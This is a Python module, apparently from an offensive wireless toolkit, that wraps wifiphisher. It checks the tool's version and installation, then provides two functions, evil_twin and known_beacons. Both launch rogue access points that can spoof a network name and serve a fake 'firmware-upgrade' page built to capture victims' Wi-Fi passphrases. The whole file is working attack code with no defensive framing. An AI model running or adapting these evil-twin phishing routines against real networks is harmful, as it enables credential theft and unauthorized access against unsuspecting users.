from typing import List, Optional

from ..utils import ToolError, run_quiet, tool_version, which


def _pageset_flag() -> str:
    """wifiphisher v1.4+ uses --phishing-pageset; older uses -p."""
    ver = tool_version("wifiphisher")
    # crude but reliable: 0.x / 1.0-1.3 use -p, 1.4+ accepts --phishing-pageset
    try:
        major_minor = tuple(int(x) for x in ver.split()[0].lstrip("v").split(".")[:2])
    except Exception:
        return "--phishing-pageset"
    if major_minor < (1, 4):
        return "-p"
    return "--phishing-pageset"


def _check() -> None:
    if which("wifiphisher") is None:
        raise ToolError("wifiphisher not installed (pip install wifiphisher)")


def evil_twin(
    iface: str,
    essid: Optional[str] = None,
    phishing_page: str = "firmware-upgrade",
    extra: Optional[List[str]] = None,
) -> None:
    _check()
    cmd = ["wifiphisher", "-i", iface]
    if essid:
        cmd += ["-e", essid]
    cmd += [_pageset_flag(), phishing_page]
    if extra:
        cmd.extend(extra)
    run_quiet(cmd)


def known_beacons(iface: str, phishing_page: str = "firmware-upgrade") -> None:
    _check()
    run_quiet([
        "wifiphisher", "-i", iface,
        "-nJ", _pageset_flag(), phishing_page,
    ])
